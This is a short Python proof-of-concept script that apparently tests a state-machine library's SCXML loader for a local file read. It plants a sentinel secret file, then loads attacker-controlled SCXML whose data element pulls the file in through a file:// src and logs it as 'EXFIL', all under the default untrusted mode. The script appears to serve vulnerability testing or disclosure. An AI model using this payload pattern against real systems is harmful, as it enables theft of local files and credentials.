import sys, tempfile, os
sys.path.insert(0, '.')
from statemachine.io import load

# Create a sentinel "secret" file the attacker should NOT be able to read
secret = tempfile.NamedTemporaryFile('w', suffix='.secret', delete=False)
secret.write("TOP-SECRET-SENTINEL-12345")
secret.close()
print("[*] secret file:", secret.name)

# Attacker-controlled SCXML document, loaded with DEFAULT trusted=False
scxml = f"""<?xml version="1.0"?>
<scxml xmlns="http://www.w3.org/2005/07/scxml" version="1.0" datamodel="ecmascript" initial="s">
  <datamodel>
    <data id="stolen" src="file://{secret.name}"/>
  </datamodel>
  <state id="s">
    <onentry>
      <log label="EXFIL" expr="stolen"/>
    </onentry>
  </state>
</scxml>
"""

print("[*] loading SCXML with trusted=False (secure default)...")
SM = load(scxml, format="scxml")          # default trusted=False
sm = SM()                                  # start -> datamodel init -> onentry log prints secret
os.unlink(secret.name)
